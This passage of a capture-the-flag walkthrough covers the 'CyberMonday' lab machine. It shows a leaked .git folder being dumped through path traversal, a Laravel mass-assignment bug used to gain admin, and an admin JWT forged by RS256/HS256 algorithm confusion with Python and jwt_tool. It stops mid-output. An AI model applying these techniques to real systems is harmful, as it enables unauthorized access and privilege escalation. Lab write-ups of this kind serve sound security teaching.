[-] Fetching http://cybermonday.htb/assets../.git/objects/bc/d3be4c28aa78fdc11f52b699718fd14fa3fda9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/6c/430293cc349a751385d7f0863c64bf5e0a045d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9b/b1bd7c48ab8b42c23bb04b3b2c610acad26c97 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/12/396722a79274d3caa3afff8b0fb2477d905957 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://cybermonday.htb/assets../.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://cybermonday.htb/assets../.git/objects/01/e4a6cda9eb380973b23a40d562bca8a3a198b4 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/17/eda1fa63d2bdeefffc7f2464990bf333d54906 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0d/89369b949acd2a875803a672e48b3169a74339 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9b/19b93c9f13d72749cc3bac760a28325116f3f1 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/29/32d4a69d6554cec4dea94e3194351710bd659e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a2/813a06489f33806916684e1b8bbf2795aba5eb [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fd/235f8c5d00c8c9925db3a06aa197d172279ec3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/70/4089a7fe757c137d99241b758c912d8391e19d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c1/c48a060cf65c15925509e53589835c3bf451d2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/54/7152f6a933b1c1f409283d7bdfe1ba556d4069 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e5/c5fef7a07c827e882cbf83ae5403c7e911cd3c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e4/0faa0b1f8931c144b8ff7fdefa17583d7681f8 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e4/6045ac8b2c25fb9a5779dd86e27d7daac8d08e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/8f/4803c05638697d84ea28d40693324ec70f7990 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/33/bb29546eba5501bb91ab41199cce5c86ffcdf5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/88/cadcaaf281f473a7d03d757be46a6d1d307eaf [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d6/b7ef32c8478a48c3994dcadc86837f4371184d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/eb/0536286f3081c6c0646817037faf5446e3547d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/7f/2e2c6ec8c31bec764d3c5d3bb5dd5d1bedd27d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/33/91630ecc9e859dad35834a43f119a67bb7df71 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fc/acb80b3e1193e661cb1ca5f589d80af218867d [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0b/2c367981682764972ef92d67a6278f550c9f42 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2a/c86a1858718f2ae64117738c11442ea18dbdfd [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/82/a37e400815ec871d3b88cc2f08a67740cec161 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/1f/3c7668f747b71eafcb4b178d1a80511d56e80a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a9/a0f5fdd85154a13d07e4cda8f22303cac53cb9 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/03/d03b489802641c86ab6f275af99f949539f6f7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c7/788b180e2a7e5bc14c2ea9e02f9d1de42ac29b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e2/63f1e758191182a3ec57883b93e2dfe77c5e3e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/c6/4c292d6315c747bb7d85134967ae9ba0663e47 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/63/bcc82bf5ceaed53668404c7e8ca286c5f68182 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/fa/579600b150dfe96277f923c509bc473517b32a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/2b/5249110fbf73b9bc29d730553577c1328efda2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/24/25237e3360e056e6e6705323b819a136a7ed9b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a9/b549189653697bdcc2597e2a81e93fae10cea6 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/078294b451e1385fcac6ffc7518bd40128a589 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0c/74c2f4d4e86e8483c8a2ac0f6d8ffff146cc4e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/31/e5659f5ea47800d8b803c2b8d7b8d5127c70fe [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a2/09be995d70299741d5f4703f5d0a371ba51906 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a5/ca4ad59b1f94c8c49d41cdb8527b9026126cca [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/d8/28bbf33e1cced57eefe573bb6371d6d871c0db [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/a7/666dbc96dabf9121c7ab100b75351032e876f2 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/62/b6ea2ab9c84cbbfb776b430c307dc508e2642b [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/84/061fffbb46a150363c7d3ede8d8e903fc3873c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/67/372d054b30cce0b5356c375737a79d87ef69e7 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/96/233b34ccba706a9f89dca87a9282a3cd836e0a [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/90/50e10b0988351ff02412e2a3eb2d77cd982c48 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/9f/64856f645658aeda1c3d6a07b544e550097f70 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3f/ad2cd925b761af3387f47d5ed471a0bddc690e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/42/87910964feb86119d87658b97ff556ac06d585 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/3c/f5e09286183fa233fe39d26dad9f902fc1c69e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/22/57b3b323f34bdf71cc9c43977661c7d54b2e6c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f2/d718fb4f64af26296e2d5fa4ae4dee04aee886 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/95/47e7d7740a164f5fd6f10aec0d0d98ed09e23e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/70/46c26a14dfd083b613b04e5fb464c1b8f05a1e [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/90/bf9ee57364b1e707fb400a8561c6f0083af928 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e9/3e4a3f9c394c636dcf0fe673ddb42c2fa180c3 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/e3/dff6b7c1c86ad0a72845e554d4fffecff9f6b5 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/f0/0a628d46a5fb12ee6f4fb81647ad94ded4246c [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/32/e46a3cd15b9aa54cccc46fc53990f382062325 [200]
[-] Fetching http://cybermonday.htb/assets../.git/objects/0e/d15f710f3fdd9cd4255795cedb4f4e61aa59e8 [200]
[-] Running git checkout .

```

The result is the source for the site:

```

oxdf@hacky$ ls
app            composer.lock  package.json  resources  webpack.mix.js
artisan        config         phpunit.xml   routes
bootstrap      database       public        storage
composer.json  lang           README.md     tests

```

There’s only one commit in the repo:

```

oxdf@hacky$ git log
commit f439e6a6a358e6effbc092f837e88311ce3e6712 (HEAD -> master)
Author: guest <guest@mail.com>
Date:   Tue Jan 24 01:51:33 2023 +0000

    backup

```

### Source Code Analysis

#### Routes

`app/routes/web.php` defines the routes for the website:

```

Route::get('/', function () {
    return view('welcome',['title' => 'Welcome']);
})->name('welcome');

Route::get('/products',[ProductController::class,'index'])->name('products');
Route::get('/product/{product:id}',[ProductController::class,'show'])->name('products.show');

Route::get('/logout',[AuthController::class,'destroy'])->name('logout');

Route::middleware('guest')->group(function(){

    Route::get('/signup',[AuthController::class,'registerForm'])->name('register.form');
    Route::post('/signup',[AuthController::class,'register'])->name('register');
    Route::get('/login',[AuthController::class,'loginForm'])->name('login.form');
    Route::post('/login',[AuthController::class,'login'])->name('login');

});

Route::prefix('home')->middleware('auth')->group(function(){

    Route::get('/',[HomeController::class,'index'])->name('home');

    Route::get('/profile',[ProfileController::class,'index'])->name('home.profile');
    Route::post('/update',[ProfileController::class,'update'])->name('home.profile.update');

});

Route::prefix('dashboard')->middleware('auth.admin')->group(function(){
        
    Route::get('/',[DashboardController::class,'index'])->name('dashboard');

    Route::get('/products',[ProductController::class,'create'])->name('dashboard.products');
    Route::post('/products',[ProductController::class,'store'])->name('dashboard.products.store');
    
    Route::get('/changelog',[ChangelogController::class,'index'])->name('dashboard.changelog');

});

```

Most of these I’ve seen before, but `/dashboard` is new. Trying to visit while logged in redirects to `/home`. However, trying to visit while logged out returns a Laravel debug crash:

![image-20231128101445242](/img/image-20231128101445242.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

“Attempt to read property “isAdmin” on null”.

The number of routes that take any input from the user is small. The `home` route has a route to update the user profile:

```

Route::prefix('home')->middleware('auth')->group(function(){

    Route::get('/',[HomeController::class,'index'])->name('home');

    Route::get('/profile',[ProfileController::class,'index'])->name('home.profile');
    Route::post('/update',[ProfileController::class,'update'])->name('home.profile.update');

});

```

I’ll want to check that one out.

#### Views

In `app/resources/views/partials/header.blade.php`, it defines the header, and there’s a check for `auth()->user()->isAdmin` when building the nav bar:

```

@if(auth()->user())
    <a href="{{ route('home') }}"
        class="border-transparent text-gray-900 hover:border-gray-300 hover:text-gray-700 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">Home</a>
    @if(auth()->user()->isAdmin)
        <a href="{{ route('dashboard') }}"
            class="border-transparent text-gray-900 hover:border-gray-300 hover:text-gray-700 inline-flex items-center px-1 pt-1 border-b-2 text-sm font-medium">Dashboard</a>  
    @endif
@endif

```

This is confirmation that the dashboard is intended for admins.

I’ll look at the views in `app/resources/views/dashboard`, but there isn’t much interesting.

#### Controllers

The controllers are in `app/Http/Controllers`. From the route above, the `update` function of the `ProfileController` class in `ProfileController.php` is called when there’s a POST request to `/home/update`:

```

    public function update(Request $request)
    {
        $data = $request->except(["_token","password","password_confirmation"]);
        $user = User::where("id", auth()->user()->id)->first();

        if(isset($request->password) && !empty($request->password))
        {
            if($request->password != $request->password_confirmation)
            {
                session()->flash('error','Password dont match');
                return back();
            }

            $data['password'] = bcrypt($request->password);
        }

        $user->update($data);
        session()->flash('success','Profile updated');

        return back();
    }

```

### Get Admin Access

#### Identify Mass Assignment

The code above for profile updates gets the current `User` object, and updates the data. However, there’s a mass assignment vulnerability here! It takes all the POST request fields except for `_token`, `password,` and `password_confirmation`, and then (after also updating the password with a bcrypt hash if necessary) updates the user object. This means if I submit a `isAdmin` field, it can be set.

#### Exploit

To exploit this, I’ll send one of the POST requests to Burp Repeater and add `isAdmin=1` to the end of the data:

![image-20231128103157738](/img/image-20231128103157738.png)

The response is a simple 302 to `/home/profile`, but on refreshing the page, I’ll see “Dashboard” is added to the nav bar:

![image-20231128103303285](/img/image-20231128103303285.png)

### Enumerate Admin Access

#### Products

The dashboard has a bunch of graphs:

![image-20231128103430102](/img/image-20231128103430102.png)

There’s nothing interesting on this page. The “Products” link (`/dashbard/products`) gives a form to add products:

![image-20231128103509151](/img/image-20231128103509151.png)

It works, and I can add products:

![image-20231128103534639](/img/image-20231128103534639.png)

I’ll try some XSS payloads, but nothing simple works:

![image-20231128103627697](/img/image-20231128103627697.png)

#### Changelog

The other link in the dashboard is to “Changelog” (`/dashboard/changelog`):

![image-20231128103732173](/img/image-20231128103732173.png)

This seems to imply there is a SQL injection in the login page, but I don’t see it in the code and can’t get it to work on my own.

There’s also a link to a webhook url, `http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77`. That’s a new subdomain!

## Shell as www-data in Container

### Enumerate webhooks-api-beta

#### Exploring the API

The link in the changelog returns an empty page. Looking at the request, it’s a 404:

```

HTTP/1.1 404 Not Found
Server: nginx/1.25.1
Date: Tue, 28 Nov 2023 15:45:03 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Host: webhooks-api-beta.cybermonday.htb
X-Powered-By: PHP/8.2.7
Set-Cookie: PHPSESSID=b1016cd227ebb1533ced7f899aef6898; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 0

```

Trying just `/webhooks` returns an unauthorized error:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks
{"status":"error","message":"Unauthorized"}

```

The root returns JSON showing the full API. I’ll use `jq` to pretty print it:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb -s | jq .
  "status": "success",
  "message": {
    "routes": {
      "/auth/register": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/auth/login": {
        "method": "POST",
        "params": [
          "username",
          "password"
        ]
      },
      "/webhooks": {
        "method": "GET"
      },
      "/webhooks/create": {
        "method": "POST",
        "params": [
          "name",
          "description",
          "action"
        ]
      },
      "/webhooks/delete:uuid": {
        "method": "DELETE"
      },
      "/webhooks/:uuid": {
        "method": "POST",
        "actions": {
          "sendRequest": {
            "params": [
              "url",
              "method"
            ]
          },
          "createLogFile": {
            "params": [
              "log_name",
              "log_content"
            ]
          }
        }
      }
    }
  }
}

```

If I try to interact with the API with POST data, it doesn’t work:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/auth/login -d 'username=0xdf&password=0xdf0xdf'
{"status":"error","message":"\"username\" not defined"}

```

If I switch to JSON, it works:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/auth/login -d '{"username": "0xdf", "password": "0xdf0xdf"}' -H "Content-Type: application/json"
{"status":"error","message":"Invalid Credentials"}

```

It’s still failing, but at least it’s processing the input. This response also shows that the creds from the other site are not used here.

I’m able to register a user:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/auth/register -d '{"username": "0xdf", "password": "0xdf0xdf"}' -H "Content-Type: application/json"
{"status":"success","message":"success"}

```

Now logging in returns a `x-access-token`:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/auth/login -d '{"username": "0xdf", "password": "0xdf0xdf"}' -H "Content-Type: application/json"
{"status":"success","message":{"x-access-token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweGRmIiwicm9sZSI6InVzZXIifQ.o86ZOGoDXOm1EvtAhh-QN24vdRflWEEYxk_IHYjpA8-Q29vwslTWu6_eBgcma4iQWOUN-g-Cg82Js2QSlhrpl368qaVrEWAdhxTYJK-AULQXDlgw35s0HrF1p8n_0ZMjiIL3h-uIMoe9VhiQUM0HwDMB4cqNk01ltKg1R5ALgHfjLF2z4mcRhr4ieBkLaQxyCEVHuHuVAilmcc0YhhoTcfZErUWfVzRH-zLcKFLDnlQZ5lCWUngYM8m0fSNAO6Nx0E94i-nJzg9APTZhDoNuVW2AKr3eZXb41WCc9ryTFACVVvgFquGR1gVY08rSOPHaQ8_7gFKctl1fNpDt62xLEA"}}

```

Without the token (as shown above), `/webhooks` returns an unauthorized message. I’ll use the token, and it works:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks -H "x-access-token: $TOKEN"
{"status":"success","message":[{"id":1,"uuid":"fda96d32-e8c8-4301-8fb3-c821a316cf77","name":"tests","description":"webhook for tests","action":"createLogFile"}]}

```

If I try the `/webhooks/create` or other webhooks endpoints, it just returns unauthorized:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $TOKEN" -d '{"name": "0xdf-webhook", "description": "hacking this thing", "action": "root"}'
{"status":"error","message":"Unauthorized"}

```

#### Tech Stack

The HTTP response headers don’t give anything away as far as what technology the API is written in. It could be PHP, but it could be something else. I’ve seen it uses JSON for interaction.

The 404s are just blank bodies, which isn’t a clue.

The access token is a JWT. [jwt.io](https://jwt.io/) shows the decoded information:

![image-20231128105740665](/img/image-20231128105740665.png)

The body has a role that is currently user, as well as my username. The header shows that it’s using public key crypto to validate tokens. If a site is using asymmetric crypto to validate keys, typically that’s because other sites want to accept keys signed by this site. For that to work, public key must be available.

In this case, where there’s no path to the public key given in the key metadata, it is likely on the server is a well known name (like `jwks.json` or `.wellknown/jwks.json`).

#### Web Content Brute Force

`feroxbuster` didn’t seem to filter nicely on this API, so I’ll use `ffuf`. With my typical wordlist, it doesn’t find anything:

```

oxdf@hacky$ ffuf -u http://webhooks-api-beta.cybermonday.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://webhooks-api-beta.cybermonday.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

                        [Status: 200, Size: 482, Words: 1, Lines: 1, Duration: 191ms]
:: Progress: [30000/30000] :: Job [1/1] :: 93 req/sec :: Duration: [0:04:08] :: Errors: 2 ::

```

If I try another very popular wordlist, `common.txt`, it does find something interesting:

```

oxdf@hacky$ ffuf -u http://webhooks-api-beta.cybermonday.htb/FUZZ -w /opt/SecLists/Discovery/Web-Content/common.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________
                                               
 :: Method           : GET
 :: URL              : http://webhooks-api-beta.cybermonday.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

.htaccess               [Status: 200, Size: 602, Words: 104, Lines: 21, Duration: 122ms]
jwks.json               [Status: 200, Size: 447, Words: 7, Lines: 11, Duration: 169ms]
:: Progress: [4713/4713] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

```

The `.htaccess` file doesn’t provide much:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/.htaccess
<IfModule mod_rewrite.c>
    <IfModule mod_negotiation.c>
        Options -MultiViews -Indexes
    </IfModule>

    RewriteEngine On

    # Handle Authorization Header
    RewriteCond %{HTTP:Authorization} .
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    # Redirect Trailing Slashes If Not A Folder...
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_URI} (.+)/$
    RewriteRule ^ %1 [L,R=301]

    # Send Requests To Front Controller...
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^ index.php [L]
</IfModule>

```

### Forge JWT

#### Get jwks.json

`jwks.json` is a common file associated with JSON Web Key Sets (JWKS). [This post](https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-key-sets) from Okta goes into detail. Even without bruteforcing it would have been possible to find this just by guessing at some common file names.

The file has the RSA elements of the public key:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/jwks.json
{
        "keys": [
                {
                        "kty": "RSA",
                        "use": "sig",
                        "alg": "RS256",
                        "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
                        "e": "AQAB"
                }
        ]
}

```

#### Algorithm Confusion

[This post from PortSwigger](https://portswigger.net/web-security/jwt/algorithm-confusion) has a nice background on an attack on JWTs called Algorithm Confusion. In their examples, a good webserver might look something like this:

```

function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
        // Use the provided key as an RSA public key
    } else if (algorithm == "HS256"){
        // Use the provided key as an HMAC secret key
    }
}

```

It reads the JWT header, gets the algorithm, and verifies using the appropriate key. But a lazy implementation might look like:

```

publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);

```

It’s passing the public key and the token directly to `verify`. The site is assuming that the algorithm will always be RSA, but that is actually attacker controlled, and the `verify` function (likely imported) will handle all.

That means that if an attacker uses the public key like a symmetric key, it might be accepted.

The JWT itself says what kind of algorithm is in use. If the server is lazy enough to read the public key and then pass that along with the key to the verify function, it’s possible that it uses the public key as a symmetric key and validated.

#### Generate Pem

To do this, I’ll need the public key in a string format, which is typically PEM. I’ll do this quickly in Python. I’ll start by importing the `RSA` library and `urlsafe_b64decode` (it’s important to get this one, as `b64decode` will not throw an error, but give wrong results):

```

oxdf@hacky$ python
Python 3.11.5 (main, Aug 25 2023, 13:19:50) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> from base64 import urlsafe_b64decode

```

I’ll grab the `e` value from `jwks.json`, which is URLsafe base64 encoded, and get that back to an int:

```

>>> urlsafe_b64decode(b'AQAB')
b'\x01\x00\x01'
>>> int.from_bytes(urlsafe_b64decode(b'AQAB'))
65537
>>> e = int.from_bytes(urlsafe_b64decode(b'AQAB'))

```

I’ll do the same with `n`:

```

>>> n = int.from_bytes(urlsafe_b64decode(b'pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w'))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3.11/base64.py", line 134, in urlsafe_b64decode
    return b64decode(s)
           ^^^^^^^^^^^^
  File "/usr/lib/python3.11/base64.py", line 88, in b64decode
    return binascii.a2b_base64(s, strict_mode=validate)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
binascii.Error: Incorrect padding
>>> n = int.from_bytes(urlsafe_b64decode(b'pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w=='))
>>> n
21077705076198164110050345996612932810772518568443539050967722091376715840724373912088648727462840166356037836008797866810613752598694921174993091914759002593675145922598909469318911554819111261819241455997350276504601809923734199273292278943649872262588721789631926559440043091439126662856921713786579174831565901935033306650397146382742890508658151492282389201858268597532677527914866223650606412599907677018538379813464063685144477862245532615744296358390508702719361603975980307523385389095548127340792700450704825980888363887958403440479605178094454574416540689804276427673977731782835533403716740628865097430507

```

It throws a padding error. I’ll just add `=` to the end until it works.

Now I’ll create an RSA object, and use it to get the exported key:

```

>>> key = RSA.construct((n, e))
>>> key
RsaKey(n=21077705076198164110050345996612932810772518568443539050967722091376715840724373912088648727462840166356037836008797866810613752598694921174993091914759002593675145922598909469318911554819111261819241455997350276504601809923734199273292278943649872262588721789631926559440043091439126662856921713786579174831565901935033306650397146382742890508658151492282389201858268597532677527914866223650606412599907677018538379813464063685144477862245532615744296358390508702719361603975980307523385389095548127340792700450704825980888363887958403440479605178094454574416540689804276427673977731782835533403716740628865097430507, e=65537)
>>> print(key.exportKey().decode())
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApvezvAKCOgxwsiyV6PRJ
fGMul+WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP/8jJ7WA2gDa8oP3N2J8z
Fyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn7
97IlIYr6Wqfc6ZPn1nsEhOrwO+qSD4Q24FVYeUxsn7pJ0oOWHPD+qtC5q3BR2M/S
xBrxXh9vqcNBB3ZRRA0H0FDdV6Lp/8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhn
gysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh1
6wIDAQAB
-----END PUBLIC KEY-----

```

I’ll save that as `secret`:

```

>>> secret = key.exportKey()

```

#### Sign JWT [Fail]

Next I need to forge a JWT using this secret in HS256 mode. I’ll continue in the same Python shell, importing `jwt`:

```

>>> import jwt

```

I’ll take my valid cookie and get the data from it:

```

>>> data = jwt.decode(
...   'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiIweGRmIiwicm9sZSI6InVzZXIifQ.o86ZOGoDXOm1EvtAhh-QN24vdRflWEEYxk_IHYjpA8-Q29vwslTWu6_eBgcma4iQWOUN-g-Cg82Js2QSlhrpl368qaVrEWAdhxTYJK-AULQXDlgw35s0HrF1p8n_0ZMjiIL3h-uIMoe9VhiQUM0HwDMB4cqNk01ltKg1R5ALgHfjLF2z4mcRhr4ieBkLaQxyCEVHuHuVAilmcc0YhhoTcfZErUWfVzRH-zLcKFLDnlQZ5lCWUngYM8m0fSNAO6Nx0E94i-nJzg9APTZhDoNuVW2AKr3eZXb41WCc9ryTFACVVvgFquGR1gVY08rSOPHaQ8_7gFKctl1fNpDt62xLEA',
...   secret,
...   algorithms=["RS256"]
... )
>>> data
{'id': 2, 'username': '0xdf', 'role': 'user'}

```

I’ll change the role to “admin”:

```

>>> data['role'] = 'admin'

```

When I try to sign this, it fails:

```

>>> jwt.encode(data, secret, algorithm="HS256")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/usr/lib/python3/dist-packages/jwt/api_jwt.py", line 63, in encode
    return api_jws.encode(json_payload, key, algorithm, headers, json_encoder)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/jwt/api_jws.py", line 113, in encode
    key = alg_obj.prepare_key(key)
          ^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/jwt/algorithms.py", line 189, in prepare_key
    raise InvalidKeyError(
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.

```

There’s a check to prevent just this kind of mistake by a developer!

#### Sign JWT

I could go into the library code and remove this check (in fact, I will in [Beyond Root](#modifying-pyjwt)), but the sensible thing to do here is use a tool meant for pentesting, [jwt\_tool](https://github.com/ticarpi/jwt_tool).

In general, the tool takes a JWT, as well as options. I’ll use the following:
- `-S hs256`’ - set the signing type to HMAC-SHA
- `-k public.pem` - use the key in the file, `public.pem`, where I’ve saved the key generated above
- `-I` - inject / fuzz values
- `-pc role` - modify the claim “role”
- `-pv admin` - set the role value to “admin”

When I run this, it gives a new JWT:

```

oxdf@hacky$ python jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin $TOKEN

        \   \        \         \          \                    \ 
